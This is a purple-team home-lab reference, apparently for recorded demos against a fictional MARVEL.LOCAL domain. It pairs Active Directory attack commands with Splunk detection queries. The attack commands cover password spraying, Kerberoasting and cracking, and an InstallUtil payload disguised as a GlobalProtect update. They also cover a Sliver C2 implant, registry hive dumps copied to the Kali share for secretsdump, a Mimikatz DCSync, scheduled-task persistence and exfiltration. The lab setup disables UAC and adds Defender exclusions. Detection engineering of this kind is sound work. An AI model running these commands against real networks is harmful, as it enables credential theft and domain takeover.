# Purple Team Home Lab — Commands & SPL Reference

**Domain:** MARVEL.LOCAL  
**DC:** 192.168.182.135 (HYDRA-DC)  
**THEPUNISHER:** 192.168.182.137  
**SPIDERMAN:** 192.168.182.138  
**Kali:** 192.168.182.133  
**Splunk:** 192.168.182.131  

---

## PRE-FLIGHT (pre svakog snimanja)

### VM boot redosled
1. HYDRA-DC
2. Splunk Linux
3. THEPUNISHER
4. SPIDERMAN
5. Kali

### Kali — priprema
```bash
# Sliver server
sudo sliver-server

# Unutar Sliver konzole
mtls --lport 443

# SMB share (novi terminal)
mkdir -p /tmp/share
chmod 777 /tmp/share
sudo impacket-smbserver share /tmp/share -smb2support -username kali -password kali
```

### Windows mašine — verifikacija
```powershell
Get-Service SplunkForwarder
Get-Service Sysmon64
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
(Get-MpPreference).ExclusionPath
w32tm /resync /force
```

### Splunk — verifikacija
```spl
| metadata type=hosts
| table host, recentTime
```

---

## SEGMENT 1 — RECONNAISSANCE

### DC — AD korisnici
```powershell
Get-ADUser -Filter * -Properties MemberOf | Select-Object SamAccountName, @{N="Groups";E={$_.MemberOf -join ", "}}
```

### Kali — Network sweep
```bash
nmap -sV 192.168.182.0/24
```

### SMB enumeracija (očekivan timeout)
```bash
nxc smb 192.168.182.135
```

### LDAP enumeracija (anonymous bind fail)
```bash
nxc ldap 192.168.182.135 -u '' -p '' --users
```

### Kerbrute userenum
```bash
cd ~/kerbrute
./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL users_clean.txt
```

### ASREPRoast check
```bash
impacket-GetNPUsers MARVEL.LOCAL/ -dc-ip 192.168.182.135 -no-pass -usersfile users_clean.txt
```

### Certipy — AD CS discovery
```bash
certipy-ad find -u fcastle@MARVEL.LOCAL -p Password1 -dc-ip 192.168.182.135
```

---

## SEGMENT 2 — PASSWORD SPRAYING

### Pre-spray — lockout policy
```bash
nxc smb 192.168.182.135 -u fcastle -p Password1 --pass-pol
```

### Kerbrute passwordspray
```bash
cd ~/kerbrute
./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL users_clean.txt 'Password1' --delay 100
```

### BloodHound (nakon dobijanja credentials)
```bash
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
ls -la *.json
```

### Splunk — Password Spray detekcija
```spl
index=main source="WinEventLog:Security" EventCode=4771
| rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| table _time, src_ip, username
| sort - _time
```

### Splunk — Uspešna autentifikacija (spray hit)
```spl
index=main source="WinEventLog:Security" EventCode=4768
| rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| table _time, src_ip, username
| sort - _time
```

### Splunk — Spray detection (više usera sa istog IP u kratkom periodu)
```spl
index=main source="WinEventLog:Security" EventCode=4771
| rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| bucket _time span=5m
| stats dc(username) as unique_users count by _time, src_ip
| where unique_users >= 3
| sort - _time
```

---

## SEGMENT 3 — EXECUTION (LOLBins)

### Kali — Kreiraj .NET payload
```bash
cat > /tmp/Punisher.cs << 'EOF'
using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Punisher : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\pwned.txt && hostname >> C:\\Temp\\pwned.txt");
    }
}
EOF
```

### Kali — Kompajliraj
```bash
mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
```

### THEPUNISHER — Preuzmi i pokreni (CMD)
```cmd
copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
type C:\Temp\pwned.txt
```

### Splunk — InstallUtil detekcija
```spl
index=main source="WinEventLog:Security" EventCode=4688 host=THEPUNISHER
| rex field=Message "New Process Name:\s*(?<process>[^\r\n]+)"
| rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
| search process="*InstallUtil*"
| table _time, process, cmdline
| sort - _time
```

### Splunk — Parent-child chain (Sysmon)
```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 host=THEPUNISHER
| rex field=Message "ParentImage:\s*(?<parent>[^\r\n]+)"
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "CommandLine:\s*(?<cmdline>[^\r\n]+)"
| search parent="*InstallUtil*"
| table _time, parent, process, cmdline
| sort - _time
```

---

## SEGMENT 4 — KERBEROASTING

### Kali — GetUserSPNs
```bash
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes
```

### Kali — Hashcat krek
```bash
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
```

### Splunk — Kerberoasting detekcija (RC4 enc type)
```spl
index=main source="WinEventLog:Security" EventCode=4769
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| rex field=Message "Service Name:\s*(?<service>[^\r\n]+)"
| rex field=Message "Ticket Encryption Type:\s*(?<enc_type>[^\r\n]+)"
| rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
| where enc_type="0x17"
| search NOT service="krbtgt" NOT service="*$"
| table _time, src_ip, username, service, enc_type
| sort - _time
```

---

## SEGMENT 5 — LATERAL MOVEMENT (Sliver C2)

### Kali — Sliver setup (ako nije već aktivan)
```bash
sudo sliver-server
```

```
# Unutar Sliver konzole
jobs
mtls --lport 443
```

### THEPUNISHER — Pokreni implant (CMD kao Administrator)
```cmd
C:\Temp\GlobalProtect_Update.exe
```

### Sliver konzola — verifikacija sesije
```
sessions
use <session_id>
whoami
pwd
```

### Sliver shell — test konekcije prema DC
```
shell
```
```powershell
Test-NetConnection -ComputerName 192.168.182.135 -Port 445
Test-NetConnection -ComputerName 192.168.182.135 -Port 135
```

### Splunk — C2 beaconing detekcija
```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 host=THEPUNISHER
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "DestinationIp:\s*(?<dst_ip>[^\r\n]+)"
| rex field=Message "DestinationPort:\s*(?<dst_port>[^\r\n]+)"
| search process="*Temp*"
| table _time, process, dst_ip, dst_port
| sort - _time
```

---

## SEGMENT 6 — CREDENTIAL DUMPING

### Sliver shell — SMB auth prema DC
```cmd
net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1
```

### Sliver shell — Registry hive dump
```cmd
reg save HKLM\SAM C:\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Temp\system.hive /y
reg save HKLM\SECURITY C:\Temp\security.hive /y
```

### Sliver shell — Kopiraj na Kali
```cmd
net use \\192.168.182.133\share /user:kali kali
cmd /c copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
cmd /c copy C:\Temp\system.hive \\192.168.182.133\share\system.hive
cmd /c copy C:\Temp\security.hive \\192.168.182.133\share\security.hive
```

### Kali — Secretsdump
```bash
sudo impacket-secretsdump -sam /tmp/share/sam.hive -system /tmp/share/system.hive -security /tmp/share/security.hive LOCAL
```

### DCSync — pokušaj (biće blokiran)
```cmd
# Mimikatz — Defender blokira
C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
```

### Splunk — Registry hive dump detekcija
```spl
index=main source="WinEventLog:Security" EventCode=4688 host=THEPUNISHER
| rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
| search cmdline="*reg*save*" (cmdline="*SAM*" OR cmdline="*SYSTEM*" OR cmdline="*SECURITY*")
| table _time, cmdline
| sort - _time
```

### Splunk — Defender blokade (Mimikatz)
```spl
index=main source="WinEventLog:Microsoft-Windows-Windows Defender/Operational"
  (EventCode=1116 OR EventCode=1117)
| rex field=Message "Name:\s*(?<threat>[^\r\n]+)"
| rex field=Message "Path:\s*(?<path>[^\r\n]+)"
| table _time, host, threat, path
```

---

## SEGMENT 7 — PERSISTENCE

### Sliver shell — Kreiranje scheduled task
```cmd
schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.exe" /sc onlogon /ru SYSTEM /f
schtasks /query /tn "WindowsUpdateService"
```

### Splunk — Scheduled task detekcija
```spl
index=main source="WinEventLog:Security" EventCode=4698 host=THEPUNISHER
| rex field=Message "Task Name:\s*(?<taskname>[^\r\n]+)"
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| rex field=Message "<Command>(?<command>[^<]+)</Command>"
| table _time, username, taskname, command
| sort - _time
```

### Splunk — Task iz sumnjive putanje
```spl
index=main source="WinEventLog:Security" EventCode=4698
| rex field=Message "Task Name:\s*(?<taskname>[^\r\n]+)"
| rex field=Message "<Command>(?<command>[^<]+)</Command>"
| search command="C:\\Temp*" OR command="C:\\Users*" OR command="C:\\ProgramData*"
| table _time, host, taskname, command
| sort - _time
```

---

## SEGMENT 8 — C2 + EXFILTRATION

### Sliver shell — Kreiraj loot fajl
```cmd
echo "Top secret data: customer database backup" > C:\Temp\loot.txt
```

### Sliver konzola — Exfiltration
```
exit
download C:\\Temp\\loot.txt
```

### Kali — Verifikacija
```bash
cat ~/loot.txt
```

### Splunk — Beaconing pattern
```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "DestinationIp:\s*(?<dst_ip>[^\r\n]+)"
| rex field=Message "DestinationPort:\s*(?<dst_port>[^\r\n]+)"
| where dst_port=443
| bucket _time span=1m
| stats count by _time, host, process, dst_ip
| eventstats avg(count) as avg_count stdev(count) as stdev_count by process, dst_ip
| where avg_count > 0.5 AND stdev_count < 1
```

### Splunk — Long-running connections iz user-space
```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "DestinationIp:\s*(?<dst_ip>[^\r\n]+)"
| search process="C:\\Users\\*" OR process="C:\\Temp\\*" OR process="C:\\ProgramData\\*"
| stats earliest(_time) as first_seen latest(_time) as last_seen count by host, process, dst_ip
| eval duration_minutes = round((last_seen - first_seen) / 60, 1)
| where duration_minutes > 30 AND count > 10
| sort - count
```

---

## UNIVERSAL SPL CHEAT SHEET

### Svi hostovi — status
```spl
| metadata type=hosts
| table host, recentTime
```

### Svi eventi po EventCode
```spl
index=main host=THEPUNISHER
| stats count by EventCode, source
| sort - count
```

### Top failed logons
```spl
index=main source="WinEventLog:Security" EventCode=4625
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| stats count by username, host
| sort - count
```

### LOLBins detekcija
```spl
index=main source="WinEventLog:Security" EventCode=4688
| rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
| rex field=Message "New Process Name:\s*(?<process>[^\r\n]+)"
| search (process="*certutil*" OR process="*mshta*" OR process="*rundll32*" OR process="*regsvr32*" OR process="*InstallUtil*" OR process="*msbuild*")
| table _time, host, process, cmdline
```

### Registry Run Keys (persistence)
```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13
| rex field=Message "TargetObject:\s*(?<TargetObject>[^\r\n]+)"
| rex field=Message "Image:\s*(?<Image>[^\r\n]+)"
| rex field=Message "Details:\s*(?<Details>[^\r\n]+)"
| search TargetObject="*\\CurrentVersion\\Run*"
| table _time, host, Image, TargetObject, Details
```

### Suspicious file creates
```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11
| rex field=Message "TargetFilename:\s*(?<filename>[^\r\n]+)"
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| search (filename="C:\\Temp\\*.exe" OR filename="C:\\Temp\\*.dll" OR filename="*\\Tasks\\*")
| search NOT process="*Defender*" AND NOT process="*OneDrive*"
| table _time, host, process, filename
```

### PowerShell Script Block
```spl
index=main source="WinEventLog:PowerShell" EventCode=4104
| rex field=Message "ScriptBlockText=(?<script>[^\r\n]+)"
| search (script="*Invoke-Mimikatz*" OR script="*AMSI*" OR script="*DownloadString*" OR script="*IEX*" OR script="*EncodedCommand*")
| table _time, host, script
```

### DCSync detekcija
```spl
index=main source="WinEventLog:Security" EventCode=4662
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| rex field=Message "Properties:\s*(?<properties>[^\r\n]+)"
| search properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*" OR properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
| search NOT username="*$"
| table _time, host, username, properties
```

### MITRE ATT&CK mapping
```spl
index=main source="WinEventLog:Security" earliest=-24h
| eval mitre=case(
    EventCode=4771, "T1110.003 - Password Spray",
    EventCode=4769, "T1558.003 - Kerberoasting",
    EventCode=4698, "T1053.005 - Scheduled Task",
    match('Process Command Line', "InstallUtil"), "T1218.004 - LOLBin",
    match('Process Command Line', "reg.*save"), "T1003.002 - SAM Dump",
    true(), "Other"
)
| where mitre != "Other"
| stats count by mitre
| sort - count
```

---

## TROUBLESHOOTING

### Sliver sesija pada
```bash
sudo ss -tlnp | grep 443
sudo kill -9 <PID>
sudo sliver-server
# unutar konzole:
# mtls --lport 443
```

### SMB share — port zauzet
```bash
sudo kill -9 $(sudo lsof -t -i:445)
mkdir -p /tmp/share
chmod 777 /tmp/share
sudo impacket-smbserver share /tmp/share -smb2support -username kali -password kali
```

### Splunk forwarder ne šalje Sysmon
```powershell
# Dodaj u inputs.conf Sysmon stanza
start_from = oldest
current_only = 0
checkpointInterval = 5

# ACL za Sysmon log
wevtutil.exe sl "Microsoft-Windows-Sysmon/Operational" /ca:O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x1;;;BO)(A;;0x1;;;SO)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)

Restart-Service SplunkForwarder
```

### Audit policy override (GPO)
```
# Na DC: gpmc.msc
# Default Domain Policy → Edit
# Computer Configuration → Policies → Windows Settings → Security Settings
# → Advanced Audit Policy Configuration → Audit Policies
# Postavi relevantne kategorije na Success and Failure
# pa na endpointu:
gpupdate /force
auditpol /get /subcategory:"<naziv>"
```

### EC4698 ne loguje se
```
# GPO: Default Domain Policy → Object Access → Audit Other Object Access Events → S&F
gpupdate /force
```

### EC4769 ne loguje se
```
# GPO: Default Domain Controllers Policy → Account Logon → Audit Kerberos Service Ticket Operations → S&F
gpupdate /force
```

### Hashcat memory error
```bash
# Dodaj -O flag
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force -O
# Ili koristi john
john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

### reg save Access Denied
```
# UAC mora biti isključen na THEPUNISHER
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System → EnableLUA = 0
# Reboot pa pokreni implant ponovo
```

---

## LAB KONFIGURACIJA — NAPOMENE

### GPO koji mora biti konfigurisan
| Policy | Lokacija | Setting |
|--------|----------|---------|
| Kerberos Service Ticket Operations | Default Domain Controllers Policy | S&F |
| Kerberos Authentication Service | Default Domain Controllers Policy | S&F |
| Other Object Access Events | Default Domain Policy | S&F |
| Object Access kategorije | Default Domain Policy | S&F |

### Defender exclusions (C:\Temp)
```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
```

### UAC — isključen na THEPUNISHER
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA = 0
```

### Sysmon config — Purple Lab dodaci
```xml
<!-- NetworkConnect include sekcija -->
<Image condition="begin with">C:\Temp\</Image>
<Image condition="begin with">C:\Users\</Image>
<Image condition="begin with">C:\ProgramData\</Image>
```
